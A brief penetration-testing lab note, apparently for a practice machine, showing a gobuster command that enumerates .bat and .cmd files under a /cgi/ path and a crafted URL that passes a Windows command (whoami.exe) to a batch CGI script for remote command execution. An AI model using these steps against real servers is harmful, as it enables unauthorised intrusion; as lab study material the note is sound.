# Enumeration
Path to find directories /cgi/FFUZ.cmd o .bat
```
gobuster dir -u http://10.129.205.30:8080/cgi/ -w /usr/share/dirb/wordlists/common.txt -x bat,cmd
```
Once we find the path, we have to add a parameter c
```
http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
